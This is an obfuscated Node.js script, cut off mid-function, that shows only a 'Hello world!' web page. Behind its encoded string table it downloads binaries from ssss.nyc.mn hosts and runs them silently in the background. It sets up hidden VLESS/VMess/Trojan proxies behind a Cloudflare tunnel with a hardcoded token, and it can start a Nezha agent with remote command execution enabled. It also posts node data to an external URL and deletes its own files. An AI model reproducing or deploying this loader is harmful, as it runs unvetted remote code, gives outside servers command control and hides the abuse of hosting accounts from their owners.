function _0x538e(){const _0x439dda=['\x20>\x20nul\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','utf-8','freedom','path','map','2324QiiTpr','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','success','true','&path=%2Ftrojan-argo%3Fed%3D2560#','filter','TunnelSecret','automatic\x20access\x20task\x20added\x20successfully','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','2053','\x20failed:\x20','rm\x20-rf\x20','post','config.json','/trojan-argo','child_process','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','firefox','env','1663110BdZGbM','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0avless://','vless','8443','Download\x20','toString','FILE_PATH','8IpbZGx','&path=%2Fvless-argo%3Fed%3D2560#','\x20-c\x20','nohup\x20','application/json','\x0a\x20\x20\x20\x20','\x20is\x20created','split','includes','length','NEZHA_SERVER','listen','\x20is\x20running','none','from','/api/delete-nodes','https://amd64.ssss.nyc.mn/web','pkill\x20-f\x20\x22[','\x22\x20>\x20/dev/null\x202>&1','php\x20running\x20error:\x20','false','SUB_PATH','log','eyJhIjoiMTlhYWIyZDJjMjY5ZWUyODA2NmU4YzkyMTMyOTAxNGQiLCJ0IjoiMzg2NTVmZGUtNzg1NS00ZDE2LThiM2UtMjA5NjViZGY1NTFiIiwicyI6Ik5ERXhNamxtTlRndE5UVmxNaTAwT1dNMExXSTVaVE10TjJVek1EUmlNRGcyT1dRMiJ9','Empowerment\x20success\x20for\x20','util','\x20-p\x20','unshift','response','test','forEach','http://ip-api.com/json/','https://amd64.ssss.nyc.mn/v1','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','unlinkSync','tls','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Nodes\x20uploaded\x20successfully','data','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','country_code','fileName','SERVER_PORT','rf.jenzel.dpdns.org','clear','text/plain;\x20charset=utf-8','substring','https://ipapi.co/json/','Error\x20downloading\x20files:','http\x20server\x20is\x20running\x20on\x20port:','Error\x20in\x20startserver:','stringify','cdns.doon.eu.org','readFileSync','error','/vmess-argo','org','set','--tls','trojan','unlink','b4533175-8ddd-4ae1-9f2f-a8d92dd87e90','NEZHA_KEY','https://arm64.ssss.nyc.mn/bot','https://arm64.ssss.nyc.mn/v1','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','isFile','quic','2096','CFPORT','/vless-argo','Add\x20automatic\x20access\x20task\x20faild:\x20','boot.log','list.txt','win32','catch','&fp=firefox&type=ws&host=','App\x20is\x20running','\x0a\x20\x20tunnel:\x20','\x20>/dev/null\x202>&1\x20&','mkdirSync','chmod','writeFileSync','1448Ygcykm','pipe','get','ArgoDomain:','?encryption=none&security=tls&sni=','5519154QhDAla','/api/add-subscriptions','taskkill\x20/f\x20/im\x20','basename','RailWay','https://oooo.serv00.net/add-url','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','https://amd64.ssss.nyc.mn/agent','fileUrl','arch','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','1034138wlaFWX','message','ARGO_PORT','UPLOAD_URL','existsSync','5OBualU','652371IwSPqu','PROJECT_URL','/config.json\x20>/dev/null\x202>&1\x20&','\x20-c\x20\x22','platform','has','npm\x20running\x20error:\x20','/sub.txt\x20saved\x20successfully','274286KFwlAa','web\x20running\x20error:\x20','Unhandled\x20error\x20in\x20startserver:','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','countryCode','Content-Type','direct','del\x20/f\x20/q\x20','status','ARGO_DOMAIN:','https://amd64.ssss.nyc.mn/bot','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','xtls-rprx-vision','\x0aclient_secret:\x20','createWriteStream','statSync','https://arm64.ssss.nyc.mn/agent','floor','close','\x20>/dev/null\x202>&1','Unknown','match','https://arm64.ssss.nyc.mn/web','base64','Error\x20reading\x20boot.log:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','stream','/dev/null','./tmp','127.0.0.1','join','readdirSync','1238630nPZkMY','\x20successfully','charAt','all','tcp','\x20-s\x20','then','axios','http','exec','2087','NEZHA\x20variable\x20is\x20empty,skip\x20running','pop','\x20already\x20exists','Error\x20executing\x20command:\x20','sub.txt','blackhole','arm','finish','tunnel.json','2083','push','\x0a\x0atrojan://','/api/add-nodes','11XtAmDc','Skipping\x20adding\x20automatic\x20access\x20task','random'];_0x538e=function(){return _0x439dda;};return _0x538e();}const _0x2d24c7=_0x5b92;(function(_0x173187,_0x1e6ee6){const _0x43703d={_0x4f2129:0x27a,_0x213f69:0x280,_0x3701fa:0x217,_0x20d459:0x26f,_0x5090d6:0x26a,_0x36f805:0x20f,_0xd32eb1:0x1da,_0x315c90:0x1f2},_0x267dff=_0x5b92,_0x5e337a=_0x173187();while(!![]){try{const _0x12ea09=-parseInt(_0x267dff(0x1ba))/0x1+parseInt(_0x267dff(_0x43703d._0x4f2129))/0x2+-parseInt(_0x267dff(_0x43703d._0x213f69))/0x3*(parseInt(_0x267dff(_0x43703d._0x3701fa))/0x4)+parseInt(_0x267dff(0x27f))/0x5*(parseInt(_0x267dff(_0x43703d._0x20d459))/0x6)+parseInt(_0x267dff(0x1fb))/0x7*(-parseInt(_0x267dff(_0x43703d._0x5090d6))/0x8)+-parseInt(_0x267dff(_0x43703d._0x36f805))/0x9+-parseInt(_0x267dff(_0x43703d._0xd32eb1))/0xa*(-parseInt(_0x267dff(_0x43703d._0x315c90))/0xb);if(_0x12ea09===_0x1e6ee6)break;else _0x5e337a['push'](_0x5e337a['shift']());}catch(_0x5ff1b){_0x5e337a['push'](_0x5e337a['shift']());}}}(_0x538e,0x941f5));const express=require('express'),app=express(),axios=require(_0x2d24c7(0x1e1)),os=require('os'),fs=require('fs'),path=require(_0x2d24c7(0x1f9)),{promisify}=require(_0x2d24c7(0x230)),exec=promisify(require(_0x2d24c7(0x20b))[_0x2d24c7(0x1e3)]),{execSync}=require(_0x2d24c7(0x20b)),UPLOAD_URL=process['env'][_0x2d24c7(0x27d)]||'',PROJECT_URL=process[_0x2d24c7(0x20e)][_0x2d24c7(0x281)]||'',AUTO_ACCESS=process[_0x2d24c7(0x20e)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x2d24c7(0x20e)][_0x2d24c7(0x216)]||_0x2d24c7(0x1d6),SUB_PATH=process[_0x2d24c7(0x20e)][_0x2d24c7(0x22c)]||'rwSub',PORT=process[_0x2d24c7(0x20e)][_0x2d24c7(0x241)]||process[_0x2d24c7(0x20e)]['PORT']||0xbb8,UUID=process[_0x2d24c7(0x20e)]['UUID']||_0x2d24c7(0x254),NEZHA_SERVER=process[_0x2d24c7(0x20e)][_0x2d24c7(0x221)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2d24c7(0x20e)][_0x2d24c7(0x255)]||'',ARGO_DOMAIN=process['env']['ARGO_DOMAIN']||_0x2d24c7(0x242),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x2d24c7(0x22e),ARGO_PORT=process[_0x2d24c7(0x20e)][_0x2d24c7(0x27c)]||0x2315,CFIP=process[_0x2d24c7(0x20e)]['CFIP']||_0x2d24c7(0x24b),CFPORT=process[_0x2d24c7(0x20e)][_0x2d24c7(0x25c)]||0x1bb,NAME=process[_0x2d24c7(0x20e)]['NAME']||_0x2d24c7(0x273);!fs[_0x2d24c7(0x27e)](FILE_PATH)?(fs[_0x2d24c7(0x267)](FILE_PATH),console[_0x2d24c7(0x22d)](FILE_PATH+_0x2d24c7(0x21d))):console[_0x2d24c7(0x22d)](FILE_PATH+_0x2d24c7(0x1e7));function generateRandomName(){const _0x2777a4={_0x4d3d3c:0x1cb,_0x251998:0x220},_0x16005a=_0x2d24c7,_0x2767d4='abcdefghijklmnopqrstuvwxyz';let _0x48dd0f='';for(let _0x34004c=0x0;_0x34004c<0x6;_0x34004c++){_0x48dd0f+=_0x2767d4[_0x16005a(0x1dc)](Math[_0x16005a(_0x2777a4._0x4d3d3c)](Math[_0x16005a(0x1f4)]()*_0x2767d4[_0x16005a(_0x2777a4._0x251998)]));}return _0x48dd0f;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2d24c7(0x1d8)](FILE_PATH,npmName),phpPath=path[_0x2d24c7(0x1d8)](FILE_PATH,phpName),webPath=path[_0x2d24c7(0x1d8)](FILE_PATH,webName),botPath=path[_0x2d24c7(0x1d8)](FILE_PATH,botName),subPath=path[_0x2d24c7(0x1d8)](FILE_PATH,_0x2d24c7(0x1e9)),listPath=path[_0x2d24c7(0x1d8)](FILE_PATH,_0x2d24c7(0x260)),bootLogPath=path[_0x2d24c7(0x1d8)](FILE_PATH,_0x2d24c7(0x25f)),configPath=path[_0x2d24c7(0x1d8)](FILE_PATH,_0x2d24c7(0x209));function deleteNodes(){const _0x1632b2={_0x241fe1:0x1f7,_0x1b1425:0x21e,_0x1c3948:0x200},_0x325e50=_0x2d24c7;try{if(!UPLOAD_URL)return;if(!fs[_0x325e50(0x27e)](subPath))return;let _0x50c3e2;try{_0x50c3e2=fs[_0x325e50(0x24c)](subPath,_0x325e50(_0x1632b2._0x241fe1));}catch{return null;}const _0x26a663=Buffer['from'](_0x50c3e2,_0x325e50(0x1d1))['toString']('utf-8'),_0x225a2e=_0x26a663[_0x325e50(_0x1632b2._0x1b1425)]('\x0a')[_0x325e50(_0x1632b2._0x1c3948)](_0x566d8f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x325e50(0x234)](_0x566d8f));if(_0x225a2e[_0x325e50(0x220)]===0x0)return;return axios[_0x325e50(0x208)](UPLOAD_URL+_0x325e50(0x226),JSON[_0x325e50(0x24a)]({'nodes':_0x225a2e}),{'headers':{'Content-Type':'application/json'}})[_0x325e50(0x262)](_0x4d9c44=>{return null;}),null;}catch(_0x4cbf8a){return null;}}function cleanupOldFiles(){const _0x270440={_0x1b1751:0x1d9,_0xe22a27:0x235},_0x1f4ac4={_0x30a0c7:0x259},_0x37346e=_0x2d24c7;try{const _0x4f3b6e=fs[_0x37346e(_0x270440._0x1b1751)](FILE_PATH);_0x4f3b6e[_0x37346e(_0x270440._0xe22a27)](_0x36c75a=>{const _0x54f34=_0x37346e,_0x41013c=path[_0x54f34(0x1d8)](FILE_PATH,_0x36c75a);try{const _0x3c5575=fs[_0x54f34(0x1c9)](_0x41013c);_0x3c5575[_0x54f34(_0x1f4ac4._0x30a0c7)]()&&fs['unlinkSync'](_0x41013c);}catch(_0x5a27a0){}});}catch(_0x252cdd){}}app[_0x2d24c7(0x26c)]('/',function(_0x40187b,_0x2e19a0){_0x2e19a0['send']('Hello\x20world!');});async function generateConfig(){const _0x1fea74={_0x5969c7:0x224,_0x36959e:0x212,_0x6e8da5:0x1c6,_0x266c59:0x24e,_0x370d70:0x1d7,_0x55d4b7:0x212,_0x731112:0x25a,_0xd90722:0x1e2,_0x2e8e40:0x252,_0x20234b:0x20a,_0x5919df:0x1e2},_0x4c5794=_0x2d24c7,_0x3fb86b={'log':{'access':_0x4c5794(0x1d5),'error':'/dev/null','loglevel':_0x4c5794(_0x1fea74._0x5969c7)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4c5794(_0x1fea74._0x36959e),'settings':{'clients':[{'id':UUID,'flow':_0x4c5794(_0x1fea74._0x6e8da5)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x4c5794(0x25d),'dest':0xbba},{'path':_0x4c5794(_0x1fea74._0x266c59),'dest':0xbbb},{'path':_0x4c5794(0x20a),'dest':0xbbc}]},'streamSettings':{'network':_0x4c5794(0x1de)}},{'port':0xbb9,'listen':_0x4c5794(_0x1fea74._0x370d70),'protocol':_0x4c5794(_0x1fea74._0x55d4b7),'settings':{'clients':[{'id':UUID}],'decryption':_0x4c5794(0x224)},'streamSettings':{'network':_0x4c5794(0x1de),'security':_0x4c5794(_0x1fea74._0x5969c7)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x4c5794(_0x1fea74._0x55d4b7),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4c5794(0x224)},'streamSettings':{'network':'ws','security':_0x4c5794(_0x1fea74._0x5969c7),'wsSettings':{'path':_0x4c5794(0x25d)}},'sniffing':{'enabled':!![],'destOverride':[_0x4c5794(0x1e2),_0x4c5794(0x23a),_0x4c5794(_0x1fea74._0x731112)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4c5794(_0x1fea74._0x370d70),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4c5794(0x24e)}},'sniffing':{'enabled':!![],'destOverride':[_0x4c5794(_0x1fea74._0xd90722),'tls',_0x4c5794(0x25a)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x4c5794(_0x1fea74._0x2e8e40),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4c5794(0x224),'wsSettings':{'path':_0x4c5794(_0x1fea74._0x20234b)}},'sniffing':{'enabled':!![],'destOverride':[_0x4c5794(_0x1fea74._0x5919df),_0x4c5794(0x23a),_0x4c5794(0x25a)],'metadataOnly':![]}}],'dns':{'servers':['https+local://dns.adguard-dns.com/dns-query']},'outbounds':[{'protocol':_0x4c5794(0x1f8),'tag':_0x4c5794(0x1c0)},{'protocol':_0x4c5794(0x1ea),'tag':'block'}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x4c5794(0x209)),JSON[_0x4c5794(0x24a)](_0x3fb86b,null,0x2));}function getSystemArchitecture(){const _0x18df60=_0x2d24c7,_0x12ec5c=os[_0x18df60(0x278)]();return _0x12ec5c===_0x18df60(0x1eb)||_0x12ec5c==='arm64'||_0x12ec5c==='aarch64'?'arm':'amd';}function downloadFile(_0x240e44,_0x41023d,_0x360d6c){const _0x4d2342={_0x1bfcfa:0x26c,_0x16796f:0x1d4,_0x31927a:0x1e0},_0x54e21d={_0x223147:0x27b},_0x5b45e6={_0x20ecaa:0x23d,_0x1a0e32:0x26b,_0x438cd2:0x1ec},_0x582b33={_0x4f6f7d:0x253,_0x3d926d:0x27b,_0x2f0e92:0x24d},_0x1e20ec=_0x2d24c7,_0x2e1def=_0x240e44;!fs['existsSync'](FILE_PATH)&&fs[_0x1e20ec(0x267)](FILE_PATH,{'recursive':!![]});const _0x328985=fs[_0x1e20ec(0x1c8)](_0x2e1def);axios({'method':_0x1e20ec(_0x4d2342._0x1bfcfa),'url':_0x41023d,'responseType':_0x1e20ec(_0x4d2342._0x16796f)})[_0x1e20ec(_0x4d2342._0x31927a)](_0x2a6a55=>{const _0x199e21={_0x5daf00:0x1cc,_0x34fe57:0x22d,_0x5d1f86:0x1db},_0x257963=_0x1e20ec;_0x2a6a55[_0x257963(_0x5b45e6._0x20ecaa)][_0x257963(_0x5b45e6._0x1a0e32)](_0x328985),_0x328985['on'](_0x257963(_0x5b45e6._0x438cd2),()=>{const _0x35ad44=_0x257963;_0x328985[_0x35ad44(_0x199e21._0x5daf00)](),console[_0x35ad44(_0x199e21._0x34fe57)](_0x35ad44(0x214)+path['basename'](_0x2e1def)+_0x35ad44(_0x199e21._0x5d1f86)),_0x360d6c(null,_0x2e1def);}),_0x328985['on']('error',_0x181706=>{const _0x51b2d7=_0x257963;fs[_0x51b2d7(_0x582b33._0x4f6f7d)](_0x2e1def,()=>{});const _0x28cee2=_0x51b2d7(0x214)+path[_0x51b2d7(0x272)](_0x2e1def)+'\x20failed:\x20'+_0x181706[_0x51b2d7(_0x582b33._0x3d926d)];console[_0x51b2d7(_0x582b33._0x2f0e92)](_0x28cee2),_0x360d6c(_0x28cee2);});})[_0x1e20ec(0x262)](_0x2cc177=>{const _0x3e0cc0=_0x1e20ec,_0x4f74fa='Download\x20'+path['basename'](_0x2e1def)+_0x3e0cc0(0x206)+_0x2cc177[_0x3e0cc0(_0x54e21d._0x223147)];console['error'](_0x4f74fa),_0x360d6c(_0x4f74fa);});}async function downloadFilesAndRun(){const _0x4fc784={_0x244609:0x22d,_0x3125dd:0x238,_0x217bff:0x1fa,_0x454bd2:0x1dd,_0x2c4bac:0x247,_0x535929:0x21e,_0x49511d:0x1e6,_0x140a8b:0x1ee,_0x16e0ad:0x205,_0x53f853:0x1b7,_0x2aa58a:0x279,_0x42d965:0x21a,_0x2b350b:0x210,_0x557ecc:0x223,_0x475b74:0x1e4,_0x2601d0:0x251,_0x5533d4:0x22d,_0x196b8d:0x24d,_0x4842c4:0x1b8,_0x5068c5:0x22d,_0x5f21c6:0x1cf,_0x4328cb:0x1f6,_0xd8b4fa:0x258,_0x230616:0x1c5,_0xbff751:0x21a,_0x17e1d8:0x1e8},_0x376ac6={_0x2b2ea4:0x27e},_0x44a6d4={_0xcf8049:0x240},_0x319e83=_0x2d24c7,_0x2b9fb5=getSystemArchitecture(),_0xecb464=getFilesForArchitecture(_0x2b9fb5);if(_0xecb464[_0x319e83(0x220)]===0x0){console[_0x319e83(_0x4fc784._0x244609)](_0x319e83(_0x4fc784._0x3125dd));return;}const _0x324f54=_0xecb464[_0x319e83(_0x4fc784._0x217bff)](_0x43fa18=>{return new Promise((_0x20c2b9,_0x3c064a)=>{const _0x4e5157=_0x5b92;downloadFile(_0x43fa18[_0x4e5157(_0x44a6d4._0xcf8049)],_0x43fa18[_0x4e5157(0x277)],(_0x18484b,_0x3bf51f)=>{_0x18484b?_0x3c064a(_0x18484b):_0x20c2b9(_0x3bf51f);});});});try{await Promise[_0x319e83(_0x4fc784._0x454bd2)](_0x324f54);}catch(_0x463428){console[_0x319e83(0x24d)](_0x319e83(_0x4fc784._0x2c4bac),_0x463428);return;}function _0x213b98(_0x206ef2){const _0x486f8c=0x1fd;_0x206ef2['forEach'](_0x2282e8=>{const _0x3249b4={_0xae63cd:0x24d},_0x29458a=_0x5b92;fs[_0x29458a(_0x376ac6._0x2b2ea4)](_0x2282e8)&&fs[_0x29458a(0x268)](_0x2282e8,_0x486f8c,_0x3f3d8d=>{const _0xd495fa=_0x29458a;_0x3f3d8d?console[_0xd495fa(_0x3249b4._0xae63cd)]('Empowerment\x20failed\x20for\x20'+_0x2282e8+':\x20'+_0x3f3d8d):console[_0xd495fa(0x22d)](_0xd495fa(0x22f)+_0x2282e8+':\x20'+_0x486f8c['toString'](0x8));});});}const _0x55b094=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x213b98(_0x55b094);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xae41d5=NEZHA_SERVER[_0x319e83(0x21f)](':')?NEZHA_SERVER[_0x319e83(_0x4fc784._0x535929)](':')[_0x319e83(_0x4fc784._0x49511d)]():'',_0x5bcc69=new Set(['443',_0x319e83(0x213),'2096','2087',_0x319e83(_0x4fc784._0x140a8b),_0x319e83(_0x4fc784._0x16e0ad)]),_0x1f446f=_0x5bcc69[_0x319e83(_0x4fc784._0x53f853)](_0xae41d5)?_0x319e83(0x1fe):_0x319e83(0x22b),_0x2ad2f4=_0x319e83(0x1c7)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x319e83(_0x4fc784._0x2aa58a)+_0x1f446f+_0x319e83(0x1bd)+UUID;fs[_0x319e83(0x269)](path['join'](FILE_PATH,'config.yaml'),_0x2ad2f4);const _0xeb5fbf=_0x319e83(_0x4fc784._0x42d965)+phpPath+_0x319e83(0x283)+FILE_PATH+_0x319e83(_0x4fc784._0x2b350b);try{await exec(_0xeb5fbf),console[_0x319e83(_0x4fc784._0x244609)](phpName+_0x319e83(_0x4fc784._0x557ecc)),await new Promise(_0x1c1732=>setTimeout(_0x1c1732,0x3e8));}catch(_0x4c582e){console[_0x319e83(0x24d)](_0x319e83(0x22a)+_0x4c582e);}}else{let _0x44318f='';const _0x53a2f6=['443','8443',_0x319e83(0x25b),_0x319e83(_0x4fc784._0x475b74),_0x319e83(0x1ee),_0x319e83(_0x4fc784._0x16e0ad)];_0x53a2f6['includes'](NEZHA_PORT)&&(_0x44318f=_0x319e83(_0x4fc784._0x2601d0));const _0x45fc6b=_0x319e83(0x21a)+npmPath+_0x319e83(0x1df)+NEZHA_SERVER+':'+NEZHA_PORT+_0x319e83(0x231)+NEZHA_KEY+'\x20'+_0x44318f+_0x319e83(0x203);try{await exec(_0x45fc6b),console[_0x319e83(_0x4fc784._0x5533d4)](npmName+'\x20is\x20running'),await new Promise(_0x1eb9e1=>setTimeout(_0x1eb9e1,0x3e8));}catch(_0xa30bdb){console[_0x319e83(_0x4fc784._0x196b8d)](_0x319e83(_0x4fc784._0x4842c4)+_0xa30bdb);}}}else console[_0x319e83(_0x4fc784._0x5068c5)](_0x319e83(0x1e5));const _0x4a4b89='nohup\x20'+webPath+_0x319e83(0x219)+FILE_PATH+_0x319e83(0x282);try{await exec(_0x4a4b89),console[_0x319e83(0x22d)](webName+_0x319e83(0x223)),await new Promise(_0x5b40cf=>setTimeout(_0x5b40cf,0x3e8));}catch(_0x407519){console[_0x319e83(_0x4fc784._0x196b8d)](_0x319e83(0x1bb)+_0x407519);}if(fs['existsSync'](botPath)){let _0x1d56a7;if(ARGO_AUTH[_0x319e83(_0x4fc784._0x5f21c6)](/^[A-Z0-9a-z=]{120,250}$/))_0x1d56a7=_0x319e83(_0x4fc784._0x4328cb)+ARGO_AUTH;else ARGO_AUTH[_0x319e83(0x1cf)](/TunnelSecret/)?_0x1d56a7=_0x319e83(_0x4fc784._0xd8b4fa)+FILE_PATH+'/tunnel.yml\x20run':_0x1d56a7=_0x319e83(0x1d3)+FILE_PATH+_0x319e83(_0x4fc784._0x230616)+ARGO_PORT;try{await exec(_0x319e83(_0x4fc784._0xbff751)+botPath+'\x20'+_0x1d56a7+_0x319e83(0x266)),console['log'](botName+_0x319e83(0x223)),await new Promise(_0x3b7300=>setTimeout(_0x3b7300,0x7d0));}catch(_0x2c8171){console['error'](_0x319e83(_0x4fc784._0x17e1d8)+_0x2c8171);}}await new Promise(_0x2a2816=>setTimeout(_0x2a2816,0x1388));}function getFilesForArchitecture(_0x263dc7){const _0x5955b7={_0x144ebe:0x1d0,_0xc06471:0x256,_0x4338ec:0x1ca,_0x554aeb:0x1eb,_0x39ee02:0x257,_0x17332a:0x237,_0x3119a2:0x232},_0x104bc1=_0x2d24c7;let _0xe560b5;_0x263dc7===_0x104bc1(0x1eb)?_0xe560b5=[{'fileName':webPath,'fileUrl':_0x104bc1(_0x5955b7._0x144ebe)},{'fileName':botPath,'fileUrl':_0x104bc1(_0x5955b7._0xc06471)}]:_0xe560b5=[{'fileName':webPath,'fileUrl':_0x104bc1(0x227)},{'fileName':botPath,'fileUrl':_0x104bc1(0x1c4)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x25c8ee=_0x263dc7===_0x104bc1(0x1eb)?_0x104bc1(_0x5955b7._0x4338ec):_0x104bc1(0x276);_0xe560b5[_0x104bc1(0x232)]({'fileName':npmPath,'fileUrl':_0x25c8ee});}else{const _0xb250ba=_0x263dc7===_0x104bc1(_0x5955b7._0x554aeb)?_0x104bc1(_0x5955b7._0x39ee02):_0x104bc1(_0x5955b7._0x17332a);_0xe560b5[_0x104bc1(_0x5955b7._0x3119a2)]({'fileName':phpPath,'fileUrl':_0xb250ba});}}return _0xe560b5;}function argoType(){const _0x131eeb={_0x49d7e2:0x22d,_0x14f0d8:0x21f,_0x32caa6:0x201,_0x2d3737:0x269,_0x517b75:0x1ed,_0x797725:0x1d8},_0x8b0876=_0x2d24c7;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x8b0876(_0x131eeb._0x49d7e2)](_0x8b0876(0x20c));return;}if(ARGO_AUTH[_0x8b0876(_0x131eeb._0x14f0d8)](_0x8b0876(_0x131eeb._0x32caa6))){fs[_0x8b0876(_0x131eeb._0x2d3737)](path[_0x8b0876(0x1d8)](FILE_PATH,_0x8b0876(_0x131eeb._0x517b75)),ARGO_AUTH);const _0x1ca965=_0x8b0876(0x265)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x8b0876(_0x131eeb._0x797725)](FILE_PATH,_0x8b0876(_0x131eeb._0x517b75))+_0x8b0876(0x275)+ARGO_DOMAIN+_0x8b0876(0x23e)+ARGO_PORT+_0x8b0876(0x1fc);fs[_0x8b0876(0x269)](path[_0x8b0876(0x1d8)](FILE_PATH,'tunnel.yml'),_0x1ca965);}else console[_0x8b0876(0x22d)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x1e3061={_0x37feb7:0x25f,_0x433f7a:0x1f7,_0x41599f:0x235,_0x2ed45c:0x26d,_0x64dd07:0x1d8,_0x3de6db:0x1c5,_0x54b03d:0x266,_0xcafd04:0x22d,_0x207d9b:0x223,_0x12a36f:0x24d},_0x319ada={_0x618638:0x23d,_0x47104b:0x23f,_0x413313:0x23f,_0x904e62:0x24f,_0x1695c2:0x26c,_0x42006e:0x236,_0x511546:0x1fd,_0x68371f:0x23d,_0x56ae8e:0x24f},_0x463eb2={_0x810d35:0x261,_0xd40f6c:0x228,_0x1a0963:0x245},_0x4b51cd={_0x59f5aa:0x1ef},_0x1d0709=_0x2d24c7;let _0xfdc2f6;if(ARGO_AUTH&&ARGO_DOMAIN)_0xfdc2f6=ARGO_DOMAIN,console[_0x1d0709(0x22d)](_0x1d0709(0x1c3),_0xfdc2f6),await _0x5126e8(_0xfdc2f6);else try{const _0x132ca1=fs[_0x1d0709(0x24c)](path[_0x1d0709(0x1d8)](FILE_PATH,_0x1d0709(_0x1e3061._0x37feb7)),_0x1d0709(_0x1e3061._0x433f7a)),_0x29d1ea=_0x132ca1[_0x1d0709(0x21e)]('\x0a'),_0x33759f=[];_0x29d1ea[_0x1d0709(_0x1e3061._0x41599f)](_0x285cda=>{const _0x2b7814=_0x1d0709,_0xea1595=_0x285cda['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xea1595){const _0x3b1987=_0xea1595[0x1];_0x33759f[_0x2b7814(_0x4b51cd._0x59f5aa)](_0x3b1987);}});if(_0x33759f[_0x1d0709(0x220)]>0x0)_0xfdc2f6=_0x33759f[0x0],console['log'](_0x1d0709(_0x1e3061._0x2ed45c),_0xfdc2f6),await _0x5126e8(_0xfdc2f6);else{console['log'](_0x1d0709(0x204)),fs[_0x1d0709(0x239)](path[_0x1d0709(_0x1e3061._0x64dd07)](FILE_PATH,_0x1d0709(0x25f)));async function _0x556ed3(){const _0x2455e2=_0x1d0709;try{process['platform']===_0x2455e2(_0x463eb2._0x810d35)?await exec(_0x2455e2(0x271)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x2455e2(_0x463eb2._0xd40f6c)+botName[_0x2455e2(0x1dc)](0x0)+']'+botName[_0x2455e2(_0x463eb2._0x1a0963)](0x1)+_0x2455e2(0x229));}catch(_0x2e3de3){}}_0x556ed3(),await new Promise(_0x3a6d4e=>setTimeout(_0x3a6d4e,0xbb8));const _0x2d99a8=_0x1d0709(0x1d3)+FILE_PATH+_0x1d0709(_0x1e3061._0x3de6db)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2d99a8+_0x1d0709(_0x1e3061._0x54b03d)),console[_0x1d0709(_0x1e3061._0xcafd04)](botName+_0x1d0709(_0x1e3061._0x207d9b)),await new Promise(_0x1b3404=>setTimeout(_0x1b3404,0xbb8)),await extractDomains();}catch(_0x11f106){console[_0x1d0709(_0x1e3061._0x12a36f)](_0x1d0709(0x1e8)+_0x11f106);}}}catch(_0x19435c){console['error'](_0x1d0709(0x1d2),_0x19435c);}async function _0x17a81c(){const _0x3793c9=_0x1d0709;try{const _0x55208a=await axios[_0x3793c9(0x26c)](_0x3793c9(0x246),{'timeout':0xbb8});if(_0x55208a[_0x3793c9(0x23d)]&&_0x55208a[_0x3793c9(_0x319ada._0x618638)][_0x3793c9(_0x319ada._0x47104b)]&&_0x55208a[_0x3793c9(0x23d)]['org'])return _0x55208a[_0x3793c9(_0x319ada._0x618638)][_0x3793c9(_0x319ada._0x413313)]+'_'+_0x55208a[_0x3793c9(0x23d)][_0x3793c9(_0x319ada._0x904e62)];}catch(_0x1b00ba){try{const _0x183525=await axios[_0x3793c9(_0x319ada._0x1695c2)](_0x3793c9(_0x319ada._0x42006e),{'timeout':0xbb8});if(_0x183525[_0x3793c9(0x23d)]&&_0x183525['data']['status']===_0x3793c9(_0x319ada._0x511546)&&_0x183525['data'][_0x3793c9(0x1be)]&&_0x183525[_0x3793c9(_0x319ada._0x68371f)][_0x3793c9(_0x319ada._0x56ae8e)])return 